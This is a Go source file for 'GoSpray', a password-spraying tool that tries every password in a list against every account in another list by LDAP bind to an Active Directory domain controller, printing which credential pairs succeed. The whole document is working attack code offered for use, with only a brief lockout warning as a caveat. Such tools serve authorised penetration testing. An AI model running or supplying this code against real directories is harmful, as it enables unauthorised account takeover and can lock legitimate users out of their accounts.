package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"os"

	ldap "gopkg.in/ldap.v3"
)

type configuration struct {
	accountsfile     string
	passwordfile     string
	domainController string
	verbose          bool
}

/////////////////////////////////////////////////////////////////
/// read a file line by line and add it to a string array
/////////////////////////////////////////////////////////////////
func readFile(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	lines := []string{}

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)

	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	return lines
}

/////////////////////////////////////////////////////////////////
/// Main
/////////////////////////////////////////////////////////////////
func main() {

	fmt.Println("*******************************************************")
	fmt.Println("*** GoSpray - Active Directory Password Testing     ***")
	fmt.Println("*** Be aware of account lockout policies            ***")
	fmt.Println("*** Use at your own risk                            ***")
	fmt.Println("*** WUNDERWUZZI, July 2019, MIT License             ***")
	fmt.Println("*******************************************************")
	fmt.Println()

	//Setup the basic configuration
	config := configuration{}
	flag.StringVar(&config.accountsfile, "accounts", "accounts.list", "Filename of the accounts to test. One account name per line.")
	flag.StringVar(&config.passwordfile, "passwords", "passwords.list", "Password file, one password per line.")
	flag.StringVar(&config.domainController, "dc", "ldaps://<yourdomain>.<corp>.<com>", "URL to your LDAP Server")
	flag.BoolVar(&config.verbose, "verbose", true, "Verbose errors")
	flag.Parse()

	fmt.Println("Configuration:")
	fmt.Println("==============")
	fmt.Println("Accounts File    : " + config.accountsfile)
	fmt.Println("Passwords File   : " + config.passwordfile)
	fmt.Println("Domain Controller: " + config.domainController)
	//fmt.Println("Verbose Output:    " + config.verbose)
	fmt.Println()
	log.Println("Reading Input Files.")
	passwords := readFile(config.passwordfile)
	accounts := readFile(config.accountsfile)

	log.Println("Starting.")
	for _, password := range passwords {
		for _, account := range accounts {
			validate(config, account, password)
		}
	}
	log.Printf("Done.")
}

func validate(config configuration, accountname string, password string) {
	connection, err := ldap.DialURL(config.domainController)
	if err != nil {
		log.Fatalf("Error connecting to domain: %s", err)
	}
	defer connection.Close()

	//Validate the credentials
	fmt.Printf("%s::%s::", accountname, password)
	err = connection.Bind(accountname, password)
	if err != nil {
		fmt.Println("Failed")
		if config.verbose {
			fmt.Println(err)
		}
	} else {
		fmt.Println("Success")
	}
}
